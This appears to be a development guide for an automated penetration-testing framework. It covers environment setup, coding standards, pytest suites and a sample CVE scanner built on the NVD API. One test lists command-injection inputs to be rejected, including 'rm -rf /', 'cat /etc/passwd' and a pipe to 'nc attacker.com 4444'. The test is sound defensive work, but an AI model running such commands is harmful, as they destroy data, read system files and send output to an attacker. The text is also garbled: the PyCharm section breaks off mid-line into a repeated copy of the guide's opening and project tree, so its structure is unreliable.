# Auto-Pentest Framework v0.9.1 - Development Guide
python -m pytest tests/test_web_scanner.py -v -n auto

## 🎯 **Welcome to Development**

This comprehensive development guide will help you contribute to the Auto-Pentest Framework, whether you're fixing bugs, adding features, creating custom scanners, or improving documentation. The framework is currently at v0.9.1 and production-ready.

### **🚀 What Makes This Framework Special**

The Auto-Pentest Framework is designed with developer experience in mind, featuring:
- **🏗️ Clean Architecture**: Modular design with clear separation of concerns
- **🧪 Comprehensive Testing**: 95%+ test coverage with automated CI/CD
- **📚 Rich Documentation**: API docs, examples, and best practices
- **🛠️ Developer Tools**: Linting, formatting, and debugging utilities
- **🔧 Plugin System**: Extensible architecture for custom components
- **🚀 Production Ready**: Enterprise-grade security and performance

---

## 🛠️ **Development Environment Setup**

### **Prerequisites**

```bash
# Required Software
- Python 3.8+ (3.9+ recommended)
- Git 2.20+
- Virtual Environment (venv/virtualenv/conda)
- IDE/Editor (VS Code, PyCharm, vim, etc.)

# Security Tools (automatically detected)
- nmap (network scanning)
- nikto (web vulnerability scanning)
- dirb/gobuster (directory enumeration)
- sslscan (SSL/TLS analysis)

# Optional Tools
- Docker & Docker Compose
- Pre-commit hooks
- Make (for automation)
```

### **Quick Setup**

```bash
# 1. Clone the repository
git clone <repository-url>
cd auto-pentest-framework

# 2. Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# 3. Install development dependencies
pip install --upgrade pip
pip install -r requirements.txt
pip install -r requirements-dev.txt

# 4. Install pre-commit hooks (optional but recommended)
pre-commit install

# 5. Verify installation
python verify_installation.py

# 6. Run tests to ensure everything works
python -m pytest tests/ -v

# 7. Test the framework
python main.py --help
python main.py scan-info  # Show available scanners
```

### **Project Structure Overview**

```
auto-pentest-framework/
├── main.py                       # 🚀 Main CLI entry point
├── verify_installation.py        # ✅ Installation verification
├── src/                          # 📦 Source code
│   ├── core/                     # 🏗️ Core framework components
│   │   ├── __init__.py
│   │   ├── scanner_base.py       # Abstract base classes
│   │   ├── executor.py           # Command execution engine
│   │   └── validator.py          # Input validation system
│   ├── scanners/                 # 🔍 Scanner implementations
│   │   ├── recon/                # 🌐 Network reconnaissance
│   │   │   ├── port_scanner.py   # Nmap integration
│   │   │   └── dns_scanner.py    # DNS analysis
│   │   └── vulnerability/        # 🛡️ Security scanners
│   │       ├── web_scanner.py    # Web security (Nikto)
│   │       ├── directory_scanner.py # Directory enumeration
│   │       └── ssl_scanner.py    # SSL/TLS analysis
│   ├── orchestrator/             # 🎭 Workflow management
│   │   ├── orchestrator.py       # Main orchestrator
│   │   └── scheduler.py          # Task scheduling
│   └── utils/                    # 🛠️ Utility modules
│       ├── logger.py             # Logging system
│       ├── reporter.py           # Report generation
│       ├── cache.py              # Caching system
│       └── performance.py        # Performance monitoring
├── config/                       # ⚙️ Configuration files
│   ├── settings.py               # Main settings
│   ├── tools_config.yaml         # Tool configurations
│   └── logging_config.yaml       # Logging configuration
├── templates/                    # 📄 Report templates
│   ├── report_html.jinja2        # HTML report template
│   ├── executive_summary.jinja2  # Executive summary
│   └── compliance_reports/       # Compliance templates
├── tests/                        # 🧪 Test suite
│   ├── unit/                     # Unit tests
│   ├── integration/              # Integration tests
│   ├── fixtures/                 # Test fixtures
│   └── mocks/                    # Mock objects
├── docs/                         # 📚 Documentation
│   ├── architecture_overview.md  # System architecture
│   ├── development_guide.md      # This document
│   ├── user_manual.md           # User documentation
│   └── api_documentation.md     # API reference
├── output/                       # 📊 Generated output
│   ├── logs/                     # Log files
│   ├── reports/                  # Generated reports
│   ├── cache/                    # Cache files
│   └── raw/                      # Raw scan results
├── requirements.txt              # 📋 Production dependencies
├── requirements-dev.txt          # 🛠️ Development dependencies
├── setup.py                     # 📦 Package setup
├── pyproject.toml               # 🎯 Project metadata
└── README.md                    # 📖 Project overview
```

### **Development Dependencies**

```bash
# requirements-dev.txt

# Testing Framework
pytest>=7.0.0                   # Testing framework
pytest-cov>=4.0.0              # Coverage reporting
pytest-mock>=3.8.0             # Mock objects
pytest-asyncio>=0.21.0         # Async testing
pytest-xdist>=3.0.0            # Parallel testing

# Code Quality & Formatting
black>=23.0.0                  # Code formatter
isort>=5.12.0                  # Import sorter
flake8>=6.0.0                  # Linting
pylint>=2.15.0                 # Advanced linting
mypy>=1.0.0                    # Type checking

# Development Tools
pre-commit>=3.0.0              # Git hooks
tox>=4.0.0                     # Testing automation
sphinx>=6.0.0                  # Documentation
sphinx-rtd-theme>=1.2.0        # Documentation theme

# Performance & Debugging
memory-profiler>=0.61.0        # Memory profiling
line-profiler>=4.0.0           # Line profiling
py-spy>=0.3.0                  # Performance profiling
pdb++>=0.10.0                  # Enhanced debugger
pudb>=2023.1                   # Visual debugger
icecream>=2.1.0                # Debug printing

# Security Testing
bandit>=1.7.0                  # Security linting
safety>=2.3.0                  # Dependency vulnerability scanning
```

---

## 🎨 **IDE Configuration**

### **VS Code Settings**

Create `.vscode/settings.json`:

```json
{
    "python.defaultInterpreterPath": "./venv/bin/python",
    "python.linting.enabled": true,
    "python.linting.pylintEnabled": true,
    "python.linting.flake8Enabled": true,
    "python.linting.mypyEnabled": true,
    "python.formatting.provider": "black",
    "python.sortImports.args": ["--profile", "black"],
    "editor.formatOnSave": true,
    "editor.codeActionsOnSave": {
        "source.organizeImports": true
    },
    "python.testing.pytestEnabled": true,
    "python.testing.unittestEnabled": false,
    "python.testing.pytestArgs": [
        "tests",
        "-v",
        "--tb=short"
    ],
    "files.exclude": {
        "**/__pycache__": true,
        "**/*.pyc": true,
        ".pytest_cache": true,
        ".coverage": true,
        "output/": true,
        "*.egg-info/": true
    },
    "python.analysis.typeCheckingMode": "basic",
    "python.analysis.autoImportCompletions": true
}
```

### **VS Code Extensions**

Create `.vscode/extensions.json`:

```json
{
    "recommendations": [
        "ms-python.python",
        "ms-python.black-formatter", 
        "ms-python.isort",
        "ms-python.flake8",
        "ms-python.mypy-type-checker",
        "ms-python.pylint",
        "charliermarsh.ruff",
        "davidanson.vscode-markdownlint",
        "yzhang.markdown-all-in-one",
        "redhat.vscode-yaml",
        "ms-vscode.vscode-json"
    ]
}
```

### **PyCharm Configuration**

1. **File → Settings → Project → Python Interpreter**
   - Select: `./venv/bin/python`

2. **File → Settings → Tools → External Tools**
   - Add Black formatter with arguments: `$FilePath# Auto-Pentest Framework v0.9.1 - Development Guide

## 🎯 **Welcome to Development**

This comprehensive development guide will help you contribute to the Auto-Pentest Framework, whether you're fixing bugs, adding features, creating custom scanners, or improving documentation. The framework is currently at v0.9.1 and production-ready.

### **🚀 What Makes This Framework Special**

The Auto-Pentest Framework is designed with developer experience in mind, featuring:
- **🏗️ Clean Architecture**: Modular design with clear separation of concerns
- **🧪 Comprehensive Testing**: 95%+ test coverage with automated CI/CD
- **📚 Rich Documentation**: API docs, examples, and best practices
- **🛠️ Developer Tools**: Linting, formatting, and debugging utilities
- **🔧 Plugin System**: Extensible architecture for custom components
- **🚀 Production Ready**: Enterprise-grade security and performance

---

## 🛠️ **Development Environment Setup**

### **Prerequisites**

```bash
# Required Software
- Python 3.8+ (3.9+ recommended)
- Git 2.20+
- Virtual Environment (venv/virtualenv/conda)
- IDE/Editor (VS Code, PyCharm, vim, etc.)

# Security Tools (automatically detected)
- nmap (network scanning)
- nikto (web vulnerability scanning)
- dirb/gobuster (directory enumeration)
- sslscan (SSL/TLS analysis)

# Optional Tools
- Docker & Docker Compose
- Pre-commit hooks
- Make (for automation)
```

### **Quick Setup**

```bash
# 1. Clone the repository
git clone <repository-url>
cd auto-pentest-framework

# 2. Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# 3. Install development dependencies
pip install --upgrade pip
pip install -r requirements.txt
pip install -r requirements-dev.txt

# 4. Install pre-commit hooks (optional but recommended)
pre-commit install

# 5. Verify installation
python verify_installation.py

# 6. Run tests to ensure everything works
python -m pytest tests/ -v

# 7. Test the framework
python main.py --help
python main.py scan-info  # Show available scanners
```

### **Project Structure Overview**

```
auto-pentest-framework/
├── main.py                       # 🚀 Main CLI entry point
├── verify_installation.py        # ✅ Installation verification
├── src/                          # 📦 Source code
│   ├── core/                     # 🏗️ Core framework components
│   │   ├── __init__.py
│   │   ├── scanner_base.py       # Abstract base classes
│   │   ├── executor.py           # Command execution engine
│   │   └── validator.py          # Input validation system
│   ├── scanners/                 # 🔍 Scanner implementations
│   │   ├── recon/                # 🌐 Network reconnaissance
│   │   │   ├── port_scanner.py   # Nmap integration
│   │   │   └── dns_scanner.py    # DNS analysis
│   │   └── vulnerability/        # 🛡️ Security scanners
│   │       ├── web_scanner.py    # Web security (Nikto)
│   │       ├── directory_scanner.py # Directory enumeration
│   │       └── ssl_scanner.py    # SSL/TLS analysis
│   ├── orchestrator/             # 🎭 Workflow management
│   │   ├── orchestrator.py       # Main orchestrator
│   │   └── scheduler.py          # Task scheduling
│   └── utils/                    # 🛠️ Utility modules
│       ├── logger.py             # Logging system
│       ├── reporter.py           # Report generation
│       ├── cache.py              # Caching system
│       └── performance.py        # Performance monitoring
├── config/                       # ⚙️ Configuration files
│   ├── settings.py               # Main settings
│   ├── tools_config.yaml         # Tool configurations
│   └── logging_config.yaml       # Logging configuration
├── templates/                    # 📄 Report templates
│   ├── report_html.jinja2        # HTML report template
│   ├── executive_summary.jinja2  # Executive summary
│   └── compliance_reports/       # Compliance templates
├── tests/                        # 🧪 Test suite
│   ├── unit/                     # Unit tests
│   ├── integration/              # Integration tests
│   ├── fixtures/                 # Test fixtures
│   └── mocks/                    # Mock objects
├── docs/                         # 📚 Documentation
│   ├── architecture_overview.md  # System architecture
│   ├── development_guide.md      # This document
│   ├── user_manual.md           # User documentation
│   └── api_documentation.md     # API reference
├── output/                       # 📊 Generated output
│   ├── logs/                     # Log files
│   ├── reports/                  # Generated reports
│   ├── cache/                    # Cache files
│   └── raw/                      # Raw scan results
├── requirements.txt              # 📋 Production dependencies
├── requirements-dev.txt          # 🛠️ Development dependencies
├── setup.py                     # 📦 Package setup
├── pyproject.toml               # 🎯 Project metadata

   - Add isort with arguments: `$FilePath$ --profile black`
   - Add pytest runner with arguments: `$ProjectFileDir$/tests`

3. **File → Settings → Editor → Code Style → Python**
   - Set line length to 88 (Black standard)
   - Enable automatic imports optimization

---

## 📋 **Coding Standards**

### **Python Style Guide**

We follow [PEP 8](https://pep8.org/) with Black formatter modifications:

```python
# Import Organization
import os
import sys
from pathlib import Path
from typing import Dict, List, Optional, Any, Union

import requests
import click
from rich.console import Console

from src.core.scanner_base import ScannerBase, ScanResult
from src.utils.logger import get_logger

# Constants
MAX_RETRIES = 3
DEFAULT_TIMEOUT = 30
SUPPORTED_FORMATS = ["json", "html", "pdf", "txt"]

# Class Definitions
class CustomScanner(ScannerBase):
    """
    Custom scanner implementation with enterprise features.
    
    This scanner provides advanced security assessment capabilities
    with comprehensive error handling and performance optimization.
    
    Attributes:
        name: Scanner identifier
        version: Scanner version
        capabilities: List of supported features
        
    Example:
        >>> scanner = CustomScanner()
        >>> result = scanner.scan("192.168.1.1")
        >>> print(f"Found {len(result.findings)} vulnerabilities")
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None) -> None:
        super().__init__()
        self.config = config or {}
        self.logger = get_logger(__name__)
        
    def scan(self, target: str, **kwargs) -> ScanResult:
        """
        Perform security scan on target.
        
        Args:
            target: Target IP, domain, or URL to scan
            **kwargs: Additional scan parameters
            
        Returns:
            ScanResult object with findings and metadata
            
        Raises:
            ValidationError: If target format is invalid
            ScanError: If scan execution fails
            
        Example:
            >>> result = scanner.scan("example.com", timeout=60)
            >>> assert result.status == ScanStatus.COMPLETED
        """
        # Implementation here
        pass
```

### **Documentation Standards**

```python
# Docstring Format (Google Style)
def complex_function(
    target: str,
    options: Dict[str, Any],
    timeout: int = 30,
    retries: int = 3
) -> ScanResult:
    """
    Perform complex scanning operation with advanced features.
    
    This function demonstrates proper documentation standards including
    detailed parameter descriptions, return value specifications, and
    comprehensive examples.
    
    Args:
        target: Target to scan (IP address, domain, or URL)
        options: Configuration dictionary with the following keys:
            - 'scan_type': str, type of scan to perform
            - 'intensity': int, scan intensity level (1-5)
            - 'custom_wordlist': Optional[Path], custom wordlist file
        timeout: Maximum time to wait for scan completion in seconds
        retries: Number of retry attempts for failed operations
        
    Returns:
        ScanResult object containing:
            - findings: List of discovered vulnerabilities
            - metadata: Scan execution information
            - raw_output: Original tool output
            
    Raises:
        ValidationError: When target format is invalid
        TimeoutError: When scan exceeds timeout limit
        ScanError: When scan execution fails
        
    Example:
        Basic usage:
        >>> result = complex_function("192.168.1.1", {"scan_type": "full"})
        >>> print(f"Scan completed with {len(result.findings)} findings")
        
        Advanced usage with custom options:
        >>> options = {
        ...     "scan_type": "comprehensive",
        ...     "intensity": 4,
        ...     "custom_wordlist": Path("wordlists/custom.txt")
        ... }
        >>> result = complex_function("example.com", options, timeout=300)
        
    Note:
        This function requires appropriate permissions and network access
        to the target system. Always ensure you have authorization before
        scanning external systems.
        
    See Also:
        validate_target(): Target validation function
        get_capabilities(): Scanner capability information
    """
    # Implementation here
    pass
```

---

## 🧪 **Testing Guidelines**

### **Test Structure**

```python
# tests/unit/test_port_scanner.py

import pytest
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path
from datetime import datetime

from src.scanners.recon.port_scanner import PortScanner
from src.core.scanner_base import ScanResult, ScanStatus
from tests.fixtures.mock_data import MOCK_NMAP_OUTPUT


class TestPortScanner:
    """Comprehensive test suite for PortScanner class."""
    
    @pytest.fixture
    def scanner(self):
        """Create PortScanner instance for testing."""
        return PortScanner()
    
    @pytest.fixture
    def mock_nmap_output(self):
        """Mock nmap XML output for testing."""
        return MOCK_NMAP_OUTPUT
    
    def test_scanner_initialization(self, scanner):
        """Test scanner initializes correctly."""
        assert scanner.name == "port_scanner"
        assert scanner.description is not None
        assert scanner.version is not None
        
    def test_target_validation_valid_ip(self, scanner):
        """Test validation accepts valid IP addresses."""
        valid_ips = ["192.168.1.1", "10.0.0.1", "172.16.0.1"]
        for ip in valid_ips:
            assert scanner.validate_target(ip) is True
            
    def test_target_validation_invalid_ip(self, scanner):
        """Test validation rejects invalid IP addresses."""
        invalid_ips = ["256.1.1.1", "192.168", "invalid", ""]
        for ip in invalid_ips:
            assert scanner.validate_target(ip) is False
    
    @patch('src.scanners.recon.port_scanner.subprocess.run')
    def test_scan_successful_execution(self, mock_subprocess, scanner, mock_nmap_output):
        """Test successful scan execution and result parsing."""
        # Mock subprocess return
        mock_subprocess.return_value.returncode = 0
        mock_subprocess.return_value.stdout = mock_nmap_output
        mock_subprocess.return_value.stderr = ""
        
        # Execute scan
        result = scanner.scan("192.168.1.1")
        
        # Assertions
        assert isinstance(result, ScanResult)
        assert result.status == ScanStatus.COMPLETED
        assert result.scanner_name == "port_scanner"
        assert len(result.findings) > 0
        assert result.raw_output == mock_nmap_output
        
    @patch('src.scanners.recon.port_scanner.subprocess.run')
    def test_scan_command_injection_protection(self, mock_subprocess, scanner):
        """Test scanner protects against command injection."""
        malicious_targets = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && cat /etc/passwd",
            "192.168.1.1 | nc attacker.com 4444"
        ]
        
        for target in malicious_targets:
            with pytest.raises(ValueError, match="Invalid target format"):
                scanner.scan(target)
                
    def test_scan_timeout_handling(self, scanner):
        """Test scanner handles timeouts gracefully."""
        with patch('src.scanners.recon.port_scanner.subprocess.run') as mock_subprocess:
            mock_subprocess.side_effect = TimeoutError("Scan timed out")
            
            result = scanner.scan("192.168.1.1", timeout=1)
            assert result.status == ScanStatus.FAILED
            assert "timeout" in result.errors[0].lower()
            
    @pytest.mark.parametrize("scan_type,expected_args", [
        ("quick", ["-T4", "-F"]),
        ("comprehensive", ["-T4", "-p-", "-sV", "-sC"]),
        ("stealth", ["-T2", "-sS"])
    ])
    def test_scan_type_parameters(self, scanner, scan_type, expected_args):
        """Test different scan types generate correct nmap arguments."""
        with patch('src.scanners.recon.port_scanner.subprocess.run') as mock_subprocess:
            mock_subprocess.return_value.returncode = 0
            mock_subprocess.return_value.stdout = "<nmaprun/>"
            
            scanner.scan("192.168.1.1", scan_type=scan_type)
            
            called_args = mock_subprocess.call_args[0][0]
            for expected_arg in expected_args:
                assert expected_arg in called_args


class TestPortScannerIntegration:
    """Integration tests for PortScanner with real tools."""
    
    @pytest.mark.integration
    @pytest.mark.network
    def test_real_scan_localhost(self):
        """Test real scan against localhost (requires nmap)."""
        scanner = PortScanner()
        result = scanner.scan("127.0.0.1", scan_type="quick")
        
        assert result.status == ScanStatus.COMPLETED
        assert len(result.findings) >= 0  # May have no open ports
        
    @pytest.mark.slow
    @pytest.mark.network
    def test_comprehensive_scan(self):
        """Test comprehensive scan (slow test)."""
        scanner = PortScanner()
        result = scanner.scan("127.0.0.1", scan_type="comprehensive")
        
        assert result.status == ScanStatus.COMPLETED
        # More detailed assertions here
```

### **Running Tests**

```bash
# Run all tests
pytest

# Run with coverage
pytest --cov=src --cov-report=html --cov-report=term

# Run specific test categories
pytest -m "not slow"          # Skip slow tests
pytest -m integration         # Only integration tests
pytest -m "network"           # Only network tests

# Run tests in parallel
pytest -n auto               # Auto-detect CPU cores
pytest -n 4                  # Use 4 workers

# Verbose output with detailed failures
pytest -v --tb=long

# Run specific test file
pytest tests/unit/test_port_scanner.py -v

# Run specific test function
pytest tests/unit/test_port_scanner.py::TestPortScanner::test_scan_successful_execution -v
```

---

## 🔄 **Development Workflow**

### **Git Workflow**

```bash
# Development Workflow (Feature Branch Model)

# 1. Start new feature
git checkout develop
git pull origin develop
git checkout -b feature/add-cve-scanner

# 2. Make changes and commit frequently
git add .
git commit -m "feat: implement CVE scanner base structure

- Add CVE scanner class with API integration
- Implement CVSS score parsing and severity mapping
- Add comprehensive unit tests
- Update documentation

Refs #123"

# 3. Keep feature branch updated
git checkout develop
git pull origin develop
git checkout feature/add-cve-scanner
git rebase develop  # or git merge develop

# 4. Run tests and quality checks
python -m pytest tests/ --cov=src
black src/ tests/
isort src/ tests/
flake8 src/ tests/
mypy src/

# 5. Push feature branch
git push origin feature/add-cve-scanner

# 6. Create Pull Request
# Use GitHub/GitLab interface to create PR

# 7. Address review comments
git add .
git commit -m "fix: address code review comments

- Improve error handling in CVE API calls
- Add missing type hints
- Update test assertions
- Fix documentation typos"

git push origin feature/add-cve-scanner

# 8. Merge and cleanup (after approval)
git checkout develop
git pull origin develop
git branch -d feature/add-cve-scanner
```

### **Commit Message Convention**

```bash
# Conventional Commits Format
<type>[optional scope]: <description>

[optional body]

[optional footer(s)]

# Types:
feat:     # New feature
fix:      # Bug fix
docs:     # Documentation changes
style:    # Code style changes (formatting, etc.)
refactor: # Code refactoring without functionality change
perf:     # Performance improvements
test:     # Adding or updating tests
chore:    # Maintenance tasks
ci:       # CI/CD changes
build:    # Build system changes
security: # Security improvements

# Examples:
feat(scanner): add CVE vulnerability scanner with CVSS scoring
fix(port-scanner): resolve XML parsing issue for unusual nmap output
docs(api): update scanner development guide with new examples
test(dns-scanner): add comprehensive unit tests for DNS enumeration
refactor(orchestrator): improve error handling and logging
perf(cache): optimize memory usage in result caching
security(validator): strengthen input sanitization for URLs
ci(github): add automated security scanning workflow
```

---

## 🔧 **Custom Scanner Development**

### **Creating a New Scanner**

Here's a complete example of creating a custom CVE scanner:

```python
# src/scanners/vulnerability/cve_scanner.py

from typing import Dict, List, Any, Optional
import requests
import json
from datetime import datetime, timedelta
import time

from src.core.scanner_base import ScannerBase, ScanResult, ScanStatus, ScanSeverity
from src.core.executor import CommandExecutor
from src.core.validator import InputValidator, ValidationError
from src.utils.logger import get_logger
from src.utils.cache import get_cache_manager


class CVEScanner(ScannerBase):
    """
    CVE (Common Vulnerabilities and Exposures) Scanner
    
    This scanner identifies known vulnerabilities by checking
    service versions against CVE databases and calculates
    risk scores based on CVSS metrics.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__()
        self.name = "cve_scanner"
        self.description = "CVE vulnerability scanner with CVSS scoring"
        self.version = "1.0.0"
        self.config = config or {}
        self.logger = get_logger(__name__)
        self.cache = get_cache_manager()
        
        # CVE API configuration
        self.api_base_url = self.config.get(
            "cve_api_url", 
            "https://services.nvd.nist.gov/rest/json/cves/2.0"
        )
        self.api_key = self.config.get("nvd_api_key")  # Optional API key
        self.rate_limit_delay = self.config.get("rate_limit_delay", 0.6)  # 6 seconds for 10 requests/minute
        
    def get_info(self) -> Dict[str, Any]:
        """Return scanner information and capabilities."""
        return {
            "name": self.name,
            "description": self.description,
            "version": self.version,
            "capabilities": [
                "CVE vulnerability identification",
                "CVSS score calculation", 
                "Severity assessment",
                "Exploit availability checking",
                "Patch information lookup"
            ],
            "required_tools": [],  # API-based, no external tools
            "supported_targets": ["service_info", "software_versions"],
            "output_formats": ["json", "html", "pdf"]
        }
    
    def validate_target(self, target: str) -> bool:
        """
        Validate target format for CVE scanning.
        
        For CVE scanner, target should be service information
        in format: "service:version" or JSON with service details.
        """
        try:
            if ":" in target:
                # Simple format: "apache:2.4.41"
                service, version = target.split(":", 1)
                return bool(service.strip() and version.strip())
            else:
                # Try to parse as JSON
                service_info = json.loads(target)
                return "service" in service_info and "version" in service_info
        except (ValueError, json.JSONDecodeError):
            return False
    
    def scan(self, target: str, **kwargs) -> ScanResult:
        """
        Perform CVE vulnerability scan.
        
        Args:
            target: Service information (format: "service:version" or JSON)
            **kwargs: Additional scan parameters
                - severity_filter: List of severities to include
                - max_age_days: Maximum age of CVEs to include
                - include_exploits: Whether to check for exploit availability
        """
        start_time = datetime.now()
        result = ScanResult(
            scanner_name=self.name,
            target=target,
            status=ScanStatus.RUNNING,
            start_time=start_time
        )
        
        try:
            self.logger.info(f"Starting CVE scan for: {target}")
            
            # Validate target
            if not self.validate_target(target):
                raise ValidationError(f"Invalid target format: {target}")
            
            # Parse target information
            service_info = self._parse_target(target)
            self.logger.debug(f"Parsed service info: {service_info}")
            
            # Search for CVEs
            cves = self._search_cves(service_info, **kwargs)
            
            # Process and enrich CVE data
            findings = []
            for cve_data in cves:
                finding = self._process_cve(cve_data, service_info)
                findings.append(finding)
                
            # Sort findings by severity (critical first)
            findings.sort(key=lambda x: self._severity_sort_key(x["severity"]))
            
            result.findings = findings
            result.status = ScanStatus.COMPLETED
            result.metadata = {
                "total_cves": len(findings),
                "severity_breakdown": self._get_severity_breakdown(findings),
                "service_info": service_info,
                "scan_parameters": kwargs
            }
            
            self.logger.info(f"CVE scan completed. Found {len(findings)} vulnerabilities")
            
        except Exception as e:
            self.logger.error(f"CVE scan failed: {str(e)}")
            result.status = ScanStatus.FAILED
            result.errors.append(str(e))
            
        finally:
            result.end_time = datetime.now()
            
        return result
    
    def _parse_target(self, target: str) -> Dict[str, Any]:
        """Parse target string into service information."""
        try:
            if ":" in target:
                service, version = target.split(":", 1)
                return {
                    "service": service.strip(),
                    "version": version.strip()
                }
            else:
                return json.loads(target)
        except json.JSONDecodeError:
            raise ValidationError(f"Unable to parse target: {target}")
    
    def _search_cves(self, service_info: Dict[str, Any], **kwargs) -> List[Dict[str, Any]]:
        """Search for CVEs related to the service."""
        service_name = service_info["service"]
        version = service_info.get("version", "")
        
        # Check cache first
        cache_key = f"cve_search_{service_name}_{version}"
        cached_result = self.cache.get(cache_key)
        if cached_result:
            self.logger.debug("Using cached CVE search results")
            return cached_result
        
        # Prepare API request
        params = {
            "keywordSearch": f"{service_name} {version}",
            "resultsPerPage": kwargs.get("max_results", 100)
        }
        
        # Add severity filter if specified
        severity_filter = kwargs.get("severity_filter")
        if severity_filter:
            params["cvssV3Severity"] = ",".join(severity_filter)
        
        # Add date filter if specified
        max_age_days = kwargs.get("max_age_days")
        if max_age_days:
            cutoff_date = datetime.now() - timedelta(days=max_age_days)
            params["pubStartDate"] = cutoff_date.strftime("%Y-%m-%dT%H:%M:%S.000")
        
        # Make API request
        headers = {"Accept": "application/json"}
        if self.api_key:
            headers["apiKey"] = self.api_key
        
        try:
            # Rate limiting
            time.sleep(self.rate_limit_delay)
            
            response = requests.get(
                self.api_base_url, 
                params=params, 
                headers=headers,
                timeout=30
            )
            response.raise_for_status()
            
            data = response.json()
            cves = data.get("vulnerabilities", [])
            
            # Cache results for 24 hours
            self.cache.set(cache_key, cves, ttl=86400)
            
            self.logger.info(f"Found {len(cves)} CVEs from API search")
            return cves
            
        except requests.RequestException as e:
            self.logger.error(f"CVE API request failed: {str(e)}")
            raise
    
    def _process_cve(self, cve_data: Dict[str, Any], service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Process and enrich CVE data."""
        cve = cve_data.get("cve", {})
        cve_id = cve.get("id", "Unknown")
        
        # Extract CVSS information
        metrics = cve_data.get("cve", {}).get("metrics", {})
        cvss_data = self._extract_cvss_data(metrics)
        
        # Get vulnerability description
        descriptions = cve.get("descriptions", [])
        description = ""
        for desc in descriptions:
            if desc.get("lang") == "en":
                description = desc.get("value", "")
                break
        
        # Extract references
        references = []
        for ref in cve.get("references", []):
            references.append({
                "url": ref.get("url", ""),
                "source": ref.get("source", ""),
                "tags": ref.get("tags", [])
            })
        
        # Build finding
        finding = {
            "cve_id": cve_id,
            "title": f"CVE Vulnerability: {cve_id}",
            "description": description,
            "severity": cvss_data["severity"],
            "cvss_score": cvss_data["score"],
            "cvss_vector": cvss_data["vector"],
            "published_date": cve.get("published", ""),
            "modified_date": cve.get("lastModified", ""),
            "references": references,
            "affected_service": service_info,
            "recommendation": self._generate_recommendation(cve_id, cvss_data),
            "metadata": {
                "cvss_version": cvss_data["version"],
                "exploitability_score": cvss_data.get("exploitability_score"),
                "impact_score": cvss_data.get("impact_score"),
                "attack_vector": cvss_data.get("attack_vector"),
                "attack_complexity": cvss_data.get("attack_complexity")
            }
        }
        
        return finding
    
    def _extract_cvss_data(self, metrics: Dict[str, Any]) -> Dict[str, Any]:
        """Extract CVSS scoring information."""
        # Try CVSS v3.1 first, then v3.0, then v2.0
        for version in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
            if version in metrics and metrics[version]:
                metric = metrics[version][0]  # Take first metric
                cvss_data = metric.get("cvssData", {})
                
                return {
                    "version": version,
                    "score": cvss_data.get("baseScore", 0.0),
                    "severity": cvss_data.get("baseSeverity", "Unknown").upper(),
                    "vector": cvss_data.get("vectorString", ""),
                    "exploitability_score": cvss_data.get("exploitabilityScore"),
                    "impact_score": cvss_data.get("impactScore"),
                    "attack_vector": cvss_data.get("attackVector"),
                    "attack_complexity": cvss_data.get("attackComplexity")
                }
        
        # Default if no CVSS data found
        return {
            "version": "unknown",
            "score": 0.0,
            "severity": "UNKNOWN",
            "vector": "",
            "exploitability_score": None,
            "impact_score": None,
            "attack_vector": None,
            "attack_complexity": None
        }
    
    def _generate_recommendation(self, cve_id: str, cvss_data: Dict[str, Any]) -> str:
        """Generate remediation recommendation based on CVE and CVSS data."""
        severity = cvss_data["severity"]
        score = cvss_data["score"]
        
        recommendations = {
            "CRITICAL": f"IMMEDIATE ACTION REQUIRED: CVE {cve_id} has a CRITICAL severity (CVSS: {score}). Update the affected service immediately and consider taking the system offline until patched.",
            "HIGH": f"HIGH PRIORITY: CVE {cve_id} requires urgent attention (CVSS: {score}). Schedule immediate patching and monitor for active exploitation.",
            "MEDIUM": f"MEDIUM PRIORITY: CVE {cve_id} should be addressed in the next maintenance window (CVSS: {score}). Plan for systematic patching.",
            "LOW": f"LOW PRIORITY: CVE {cve_id} has minimal risk (CVSS: {score}). Include in routine maintenance and update cycles.",
            "UNKNOWN": f"PRIORITY UNKNOWN: CVE {cve_id} requires manual assessment. Review vulnerability details and determine appropriate response."
        }
        
        base_recommendation = recommendations.get(severity, recommendations["UNKNOWN"])
        
        # Add specific recommendations based on attack vector
        attack_vector = cvss_data.get("attack_vector")
        if attack_vector == "NETWORK":
            base_recommendation += " Consider implementing network-level protections such as firewalls or access controls as a temporary mitigation."
        elif attack_vector == "LOCAL":
            base_recommendation += " Focus on access control and privilege management to limit exposure."
        
        return base_recommendation
    
    def _get_severity_breakdown(self, findings: List[Dict[str, Any]]) -> Dict[str, int]:
        """Get count of findings by severity level."""
        breakdown = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "UNKNOWN": 0}
        for finding in findings:
            severity = finding.get("severity", "UNKNOWN")
            breakdown[severity] = breakdown.get(severity, 0) + 1
        return breakdown
    
    def _severity_sort_key(self, severity: str) -> int:
        """Return sort key for severity (lower number = higher priority)."""
        severity_order = {
            "CRITICAL": 0,
            "HIGH": 1, 
            "MEDIUM": 2,
            "LOW": 3,
            "UNKNOWN": 4
        }
        return severity_order.get(severity, 5)


# Register the scanner
__all__ = ["CVEScanner"]
```

### **Adding Scanner Tests**

```python
# tests/unit/test_cve_scanner.py

import pytest
from unittest.mock import Mock, patch, MagicMock
import json
from datetime import datetime

from src.scanners.vulnerability.cve_scanner import CVEScanner
from src.core.scanner_base import ScanResult, ScanStatus
from tests.fixtures.cve_mock_data import MOCK_CVE_API_RESPONSE


class TestCVEScanner:
    """Test suite for CVE Scanner."""
    
    @pytest.fixture
    def scanner(self):
        return CVEScanner()
    
    @pytest.fixture  
    def mock_api_response(self):
        return MOCK_CVE_API_RESPONSE
    
    def test_scanner_info(self, scanner):
        """Test scanner provides correct information."""
        info = scanner.get_info()
        assert info["name"] == "cve_scanner"
        assert "CVE vulnerability identification" in info["capabilities"]
        
    def test_target_validation_simple_format(self, scanner):
        """Test validation for simple service:version format."""
        valid_targets = [
            "apache:2.4.41",
            "nginx:1.18.0", 
            "mysql:8.0.25"
        ]
        for target in valid_targets:
            assert scanner.validate_target(target) is True
            
    def test_target_validation_json_format(self, scanner):
        """Test validation for JSON service information."""
        valid_json = json.dumps({
            "service": "apache",
            "version": "2.4.41",
